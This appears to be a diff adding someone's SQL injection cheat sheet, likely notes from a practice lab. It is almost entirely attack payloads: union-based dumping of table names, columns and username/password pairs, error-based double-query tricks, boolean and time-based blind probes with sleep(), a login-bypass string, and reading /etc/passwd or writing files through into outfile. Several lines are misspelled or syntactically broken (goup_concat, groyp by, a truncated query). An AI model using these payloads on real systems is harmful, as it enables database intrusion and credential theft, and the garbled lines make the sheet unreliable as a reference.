@@ -1,0 +1,109 @@
+select uname,passwd for table_name where id = 'input'order by 15 -- + ' 
+
+show databases;
+use  database_name;
+show tables;
+desc emain;
+desc users;
+
+===============================================================================================================
+
+
+order by 1,2,3 --+
+union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1;
+union select 1,goup_concat(table_name),3 from information_schema.tables where table_schema=database();
+union select 1,goup_concat(column_name),3 from information_schema.columns where table_name='table_name';
+union select 1,goup_concat(username,password),3 from table_name; 
+
+
+
+## Double Query Injection ##
+
+select rand();
+select count() from information_schema.tables;
+select rand() * 4; 
+select floor(2.282305239);
+select floor(2.282305239)as chilico;
+selsect table_name from information_schema.tables group by table_schema;
+select database();
+select(select database());
+select concat((select database()));
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a;
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a;
+select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group 
+(select 1 from (select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.tables group by a)b) --+
+select substr(database(),1,1);  
+select substr(database(),2,1);
+select ascii(substr(database(),1,1));
+select ascii(substr(database(),1,1)) = 115;     // 1 is true 0 false
+select ascii(substr(database(),1,1)) < 115;
+select ascii(substr(database(),1,1)) > 115;
+select ascii(substr(database(),1,1)) <= 110;
+
+
+
+## Time Based Injection ##
+
+select if((select database())="security",sleep(10),null);
+select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null);
+select if((select substr(database(),1,1) from information_schema.tables where table_schema='database()' limit 0,1)='s',sleep(10),null);
+
+select if ((select database())="security",sleep(10),null);
+select if ((select version())= like 5%,sleep(10),null);
+select if ((select substr(table_name,1,1)from information_schema.tables where table_schema='databaseName' limit 0,1)='e',sleep(10),null);
+
+
+
+## Post Injection ## 
+
+select * from users into outfile "/tmp/PoC.txt";
+select load_file("/etc/passwd") into outfile "/tmp/pass.txt";
+select 1,database(),2, into dumpfile "/var/www/file.txt"; 
+
+0'or'0'='0   // login bypass 
+union select 1,2 #
+union select database(),version() #
+union select table_name,2 from information_schema.tables where table_schema=database() #
+
+
+
+## Double Query Post Injection ## 
+
+select concat((select database()));
+select concat((select database()),floor(rand(0)*2));
+select concat("~",(select database()),"~",floor(rand(0)*2));
+select concat("~",(select database()),"~",floor(rand(0)*2)) from information_schema.tables; 
+select (concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables;
+select count(*),(concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables groyp by c;
+select count(*),(concat("~",(select version()),"~",floor(rand(0)*2)))c from information_schema.tables groyp by c;
+select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables groyp by c)a;
+ AND (select 1 from (select count(*),(concat("~",(select database()),"~",floor(rand(0)*2)))c from information_schema.tables group by c)a);
+
+
+## Blind Time Based Post Injection 
+
+') or sleep(10) #
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\Left On 31
